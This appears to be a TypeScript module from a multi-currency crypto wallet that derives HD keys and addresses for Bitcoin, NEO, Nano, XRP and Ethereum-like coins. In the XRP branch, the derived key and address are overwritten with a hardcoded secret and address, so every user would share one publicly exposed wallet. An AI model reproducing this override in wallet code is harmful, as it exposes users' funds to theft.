import bip32 from 'bip32'
import bitcoin from 'bitcoinjs-lib'
import bitcoinSecp256r1 from 'bitcoinjs-lib-secp256r1'
import { wallet as NeoWallet } from '@cityofzion/neon-core'
import ethUtil from 'ethereumjs-util'
import * as nanocurrency from 'nanocurrency';
import { toBitcoinJS } from 'app/constants';
import rplk from 'ripple-keypairs';


export const getRootNode = (seed: any, rel: string, base: string, config) => {
  let rootNode
  switch (base) {
    case 'BTC':
      const network = toBitcoinJS(config[rel].network);
      rootNode = bip32.fromSeed(seed, network)
    break
    case 'NEO':
      rootNode = bitcoinSecp256r1.HDNode.fromSeedBuffer(
        seed,
        bitcoinSecp256r1.bitcoin
      )
      break
      //case 'XRP':
      //case 'XMR':
    case 'NANO':
      return seed.slice(0, 32).toString("hex");
    default:
      //eth and rest of its shitcoins
      rootNode = bip32.fromSeed(seed, bitcoin.networks.bitcoin)
    break
  }
  return rootNode
}
export const deriveAccount = (
  rootNode: any,
  account: number,
  change: number,
  index: number,
  rel: string,
  config: any,
) => {
  const networkCode = config[rel].code
  const bip44path = `m/44'/${networkCode}'/${account}'/${change}/${index}`
  return typeof rootNode == "object" ? rootNode.derivePath(bip44path) : rootNode;
}

export const getWallet = (key: any, rel: string, base: string, config) => {
  let wif, address, publicKey
  
  switch (base) {
    case 'BTC':
      const network = toBitcoinJS(config[rel].network);    
      const derivedWallet = bitcoin.payments.p2pkh({
        pubkey: key.publicKey,
        network: network
      })
      const firstKeyECPair = bitcoin.ECPair.fromPrivateKey(key.privateKey, {
        network
      })

      wif = firstKeyECPair.toWIF()
      address = derivedWallet.address
      publicKey = key.publicKey
      break
    case 'NEO':
      wif = key.keyPair.toWIF()
      const account = new NeoWallet.Account(wif)
      address = account.address
      publicKey = account.publicKey 
    break
    case 'NANO':
      wif = nanocurrency.deriveSecretKey(key, 0)
      publicKey = nanocurrency.derivePublicKey(wif)
      address = nanocurrency.deriveAddress(publicKey)
    break;  
    case 'XRP':
      wif = key.privateKey.toString(`hex`)
      publicKey = key.publicKey.toString(`hex`)
      address = rplk.deriveAddress(publicKey)

      wif = `shtwtkMtrHiwqiWcDCHXqGqaxn2QJ`
      address = `rHyVreCE6RF4YPe8cXu7cqAKFMv69Uea6n`
    break;  
    case 'XMR':
    /*
      const monero_utils = require('mymonero-core-js/monero_utils/monero_cryptonote_utils_instance')
      const walletUtils = require('mymonero-core-js/monero_utils/monero_wallet_utils')
      const k = monero_utils.create_address(key);
      console.log(k)
      console.log(walletUtils.NewlyCreatedWallet('english'))
      require("./monero_utils/monero_utils")({}).then(function (monero_utils) { 
        const mymonero = require("mymonero-core-js");
        var nettype = mymonero.nettype_utils.network_type.STAGENET;
        var decoded = monero_utils.address_and_keys_from_seed(key, nettype);
        console.log(decoded)
      });
      */
    break;  
    case 'ETH':
    case 'VET':
      //eth and rest of its shitcoins
      //var privKeyBuffer = key.__d.toBuffer(32)
      var privKeyBuffer = key.__d;
      var privkey: string = privKeyBuffer.toString('hex')
      var addressBuffer = ethUtil.privateToAddress(privKeyBuffer)
      var hexAddress = addressBuffer.toString('hex')
      var checksumAddress = ethUtil.toChecksumAddress(hexAddress)

      address = ethUtil.addHexPrefix(checksumAddress)
      wif = ethUtil.addHexPrefix(privkey)
      //pubkey = ethUtil.addHexPrefix(pubkey);
      break
  }
  return { wif, address, publicKey }
}
